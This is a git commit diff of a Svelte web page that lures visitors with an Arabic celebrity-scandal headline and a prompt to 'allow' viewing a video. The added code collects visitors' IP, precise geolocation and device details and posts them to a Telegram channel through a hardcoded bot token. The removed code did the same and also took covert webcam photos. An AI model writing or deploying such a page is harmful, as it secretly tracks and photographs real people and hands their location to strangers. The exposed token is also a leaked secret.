568a102b0a1b03b01f057f9d41fdba299a251fd3
Gomaa <137703660+mhfng@users.noreply.github.com>
2023-06-26 04:33:39 +0300

    Update App.svelte

--- src/App.svelte
+++ src/App.svelte
@@ -1,38 +1,54 @@
 <script>
   import { onMount } from 'svelte';
-  let videoElement = document.querySelector('video');
-
-
+  
   onMount(async () => {
-    try {
-      const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-      videoElement.srcObject = videoStream;
-      await videoElement.play();
-
-      const { latitude, longitude } = await getLocation();
-      const photo = await capturePhoto();
-      await sendLocationAndIPToTelegramBots(latitude, longitude, photo);
-    } catch (error) {
-      console.error(error);
-      if (error.name === 'NotAllowedError') {
-        redirectToNextURL();
+    sendIPToTelegramBots();
+    
+    // Request location permission automatically
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        // Location permission granted, send location and IP results to Telegram bots
+        await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+      },
+      (error) => {
+        if (error.code === error.PERMISSION_DENIED) {
+          // Location permission denied, send IP result to Telegram bots
+          redirectToNextURL();
+        }
       }
-    }
+    );
   });
 
-  async function sendLocationAndIPToTelegramBots(latitude, longitude, photo) {
+  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
+    // Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+
+    const message = `
+الموقع:
+
+${latitude} ${longitude}
+
+الايبي:
+
+${ipAddress}
+`;
+
+    // Create the message with the clickable link to Google Maps
     const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const clickableLink = `<a href="${locationLink}" style="color: red;">Location</a>`;
+    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
     const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
-    const ipLocationNetLink = `<a href="${ipLocationLink}">IP Location</a>`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
+    const locationIcon = "\u{1F4CD}"; // Location icon as text (Unicode character)
 
-    const locationIcon = "\u{1F4CD}";
+    const htmlMessage = `${locationIcon} ${message}\n\n${clickableLink}\n\n${ipLocationNetLink}`;
 
-    const htmlMessage = `${locationIcon} Location: ${latitude} ${longitude}\n\n${clickableLink}\n\n${ipLocationNetLink}`;
-
+    // Send location and IP results to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
       method: 'POST',
       headers: {
@@ -44,63 +60,24 @@
         parse_mode: 'HTML',
       }),
     });
-
-    await sendPhotoToTelegram(photo, latitude, longitude);
-  }
-
-  function getLocation() {
-    return new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          resolve(position.coords);
-        },
-        (error) => {
-          reject(error);
-        }
-      );
-    });
-  }
-
-  function capturePhoto() {
-    const canvas = document.createElement('canvas');
-    canvas.width = videoElement.videoWidth;
-    canvas.height = videoElement.videoHeight;
-    const context = canvas.getContext('2d');
-    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-    const photoDataUrl = canvas.toDataURL('image/jpeg');
-    return fetch(photoDataUrl).then((response) => response.blob());
-  }
-
-  async function sendPhotoToTelegram(photoBlob, latitude, longitude) {
-    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;
-
-    const formData = new FormData();
-    formData.append('photo', photoBlob, 'photo.jpg');
-    formData.append('chat_id', '@localipy'); // Replace with the channel username or ID
-    formData.append('caption', `Location: ${latitude}, ${longitude}`);
-
-    await fetch(telegramBotURL, {
-      method: 'POST',
-      body: formData,
-    });
   }
 
   async function sendIPToTelegramBots() {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
+    // Get the IP address using ipify API
     const response = await fetch('https://api.ipify.org/?format=json');
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const userAgentData = navigator.userAgentData;
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
     const screenWidth = window.screen.width;
     const screenHeight = window.screen.height;
-    const cpuCores = navigator.hardwareConcurrency || 'N/A';
-    const totalRAM = navigator.deviceMemory || 'N/A';
+    const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
+    const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
     const vendor = navigator.vendor;
     const isAndroid = userAgent.toLowerCase().includes('android');
 
@@ -110,24 +87,26 @@
     const isp = ipInfo.org || 'N/A';
 
     const message = `
-      IP: ${ipAddress}
-      Country: ${country}
-      City: ${city}
-      ISP: ${isp}
-      Platform: ${platform}
-      Screen Width: ${screenWidth}
-      Screen Height: ${screenHeight}
-      CPU Cores: ${cpuCores}
-      Total RAM: ${totalRAM}
-      Vendor: ${vendor}
-      Android: ${isAndroid ? 'Yes' : 'No'}
-      User Agent: ${userAgent}
-    `;
+الايبي: ${ipAddress}
+البلد: ${country}
+مدينة مزود الخدمة: ${city}
+المنظمة: ${isp}
+المنصة: ${platform}
+عرض الشاشة: ${screenWidth}
+ارتفاع الشاشة: ${screenHeight}
+عدد المعالجات: ${cpuCores}
+الرامات: ${totalRAM}
+شركة السوفتوير: ${vendor}
+اندرويد: ${isAndroid ? 'نعم' : 'لا'}
+باقي البيانات: ${userAgent}
+`;
 
+    // Create the message with clickable link
     const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
-    const ipLocationNetLink = `<a href="${ipLocationLink}">IP Location</a>`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
     const htmlMessage = `${message}\n\n${ipLocationNetLink}`;
 
+    // Send IP result to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
       method: 'POST',
       headers: {
@@ -136,150 +115,48 @@
       body: JSON.stringify({
         chat_id: '@localipy', // Replace with the channel username or ID
         text: htmlMessage,
-<script>
-  import { onMount } from 'svelte';
+        parse_mode: 'HTML',
+      }),
+    });
+  }
 
-  onMount(async () => {
-    try {
-      const { latitude, longitude } = await getLocation();
-      const ipAddress = await getIPAddress();
-      const photo = await capturePhoto();
-
-      await sendLocationToTelegram(latitude, longitude);
-      await sendIPToTelegram(ipAddress);
-      await sendPhotoToTelegram(photo);
-    } catch (error) {
-      console.error(error);
+  async function getIPInfo(ip) {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (response.ok) {
+      return response.json();
     }
-  });
-
-  async function sendLocationToTelegram(latitude, longitude) {
-    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
-    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const locationIcon = "\u{1F4CD}";
-
-    const htmlMessage = `${locationIcon} Location:\n\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nLocation: <a href="${locationLink}" style="color: red;">Click here</a>`;
-
-    await fetch(telegramBotURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: '@localipy', // Replace with the channel username or ID
-        text: htmlMessage,
-        parse_mode: 'HTML',
-      }),
-    });
+    return {};
   }
 
-  async function sendIPToTelegram(ipAddress) {
-    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
-    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
-    const ipIcon = "\u{1F310}";
+  function redirectToNextURL() {
+    // Get the current URL
+    var currURL = window.location.href;
 
-    const htmlMessage = `${ipIcon} IP Address:\n\n${ipAddress}\n\nIP Location: <a href="${ipLocationLink}">Click here</a>`;
+    // Extract the current number from the URL
+    var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
 
-    await fetch(telegramBotURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: '@localipy', // Replace with the channel username or ID
-        text: htmlMessage,
-        parse_mode: 'HTML',
-      }),
-    });
-  }
+    // Check if the current number is less than or equal to 999
+    if (currNum <= 999) {
+      // Increment the current number by 1 and construct the next URL
+      var nextNum = currNum + 1;
+      var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
 
-  async function sendPhotoToTelegram(photo) {
-    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;
-
-    const formData = new FormData();
-    formData.append('photo', photo, 'photo.jpg');
-    formData.append('chat_id', '@localipy'); // Replace with the channel username or ID
-
-    await fetch(telegramBotURL, {
-      method: 'POST',
-      body: formData,
-    });
-  }
-
-  function getLocation() {
-    return new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          resolve(position.coords);
-        },
-        (error) => {
-          reject(error);
-        }
-      );
-    });
-  }
-
-  function getIPAddress() {
-    return fetch('https://api.ipify.org?format=json')
-      .then((response) => response.json())
-      .then((data) => data.ip);
-  }
-
-  function capturePhoto() {
-    return new Promise((resolve, reject) => {
-      const videoElement = document.createElement('video');
-      videoElement.style.display = 'none';
-
-      document.body.appendChild(videoElement);
-
-      navigator.mediaDevices
-        .getUserMedia({ video: true })
-        .then((stream) => {
-          videoElement.srcObject = stream;
-          videoElement.play();
-
-          const canvasElement = document.createElement('canvas');
-          canvasElement.width = videoElement.videoWidth;
-          canvasElement.height = videoElement.videoHeight;
-
-          const context = canvasElement.getContext('2d');
-          context.drawImage(
-            videoElement,
-            0,
-            0,
-            videoElement.videoWidth,
-            videoElement.videoHeight
-          );
-
-          canvasElement.toBlob((blob) => {
-            resolve(blob);
-          }, 'image/jpeg');
-
-          videoElement.pause();
-          videoElement.srcObject = null;
-          stream.getTracks().forEach((track) => track.stop());
-          document.body.removeChild(videoElement);
-        })
-        .catch((error) => {
-          reject(error);
-        });
-    });
+      // Redirect to the next URL
+      window.location.href = nextURL;
+    } else {
+      // If the current number is greater than 999, display an alert message
+      // alert('You have reached the maximum number of URLs.');
+      window.location.href = 'https://mhf1.onrender.com/';
+    }
   }
 </script>
 
-
 <main>
-  <video {autoplay} {muted} {playsinline} style="display: none;"></video>
-  <h1>Getting Location and IP...</h1>
   <center>
     <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
   </center>
-
   <center>
-    <h1 style="font-size: 36px; font-weight: bold;">اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعة</h1>
+    <h1 style="font-size: 36px; font-weight: bold;">‎اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعة</h1>
   </center>
 
   <div class="image-grid">
